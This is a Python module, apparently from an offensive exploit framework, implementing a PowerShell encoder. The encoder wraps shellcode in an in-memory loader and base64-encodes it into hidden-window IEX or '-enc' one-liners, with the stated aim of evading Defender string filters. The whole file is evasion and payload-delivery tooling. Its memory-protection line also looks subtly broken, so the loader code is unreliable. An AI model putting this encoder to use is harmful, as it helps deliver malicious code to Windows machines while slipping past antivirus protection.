"""PowerShell base64 encoder.

Converte payload em one-liner PowerShell com base64 embutido.
Bypassa filtros de string básicos do Defender.
Suporta: IEX + EncodedCommand + -WindowStyle Hidden
"""

import base64
from embedxpl.core.exploit.encoder import BaseEncoder


class Encoder(BaseEncoder):
    name        = "powershell/ps_base64"
    description = "PowerShell base64 + IEX one-liner encoder"
    arch        = ["x64", "x86"]
    platform    = ["windows"]
    evasion_score = 5

    options = {
        "MODE": {
            "description": "Output mode: iex (inline), encoded_cmd (powershell -enc), file (.ps1)",
            "required": False,
            "default": "iex",
            "value": "iex",
        },
    }

    def encode(self, payload: bytes) -> bytes:
        # payload assume que é um script PS1 ou shellcode
        if payload.startswith(b"\xfc") or payload[0] < 0x20:
            # Shellcode: wrap em loader PS1
            hex_bytes = ",0x".join(f"{b:02x}" for b in payload)
            ps_script = (
                f"$sc=[byte[]](0x{hex_bytes});"
                "$ptr=[Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length);"
                "[Runtime.InteropServices.Marshal]::Copy($sc,0,$ptr,$sc.Length);"
                "$null=[Diagnostics.Process].GetMethod('VirtualProtect',[Runtime.InteropServices.HandleRef],[UInt32],[Runtime.InteropServices.NativeMethodsHelper+MemoryProtectionFlags],[Runtime.InteropServices.NativeMethodsHelper+MemoryProtectionFlags].MakeByRefType());"
                "$f=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr,[Action]);"
                "$f.Invoke()"
            )
        else:
            ps_script = payload.decode(errors="replace")

        mode = self.options["MODE"]["value"]
        if mode == "encoded_cmd":
            enc = base64.b64encode(ps_script.encode("utf-16-le")).decode()
            return f"powershell -nop -w hidden -enc {enc}".encode()
        elif mode == "file":
            return ps_script.encode()
        else:  # iex
            enc = base64.b64encode(ps_script.encode()).decode()
            return f'IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{enc}")))'.encode()
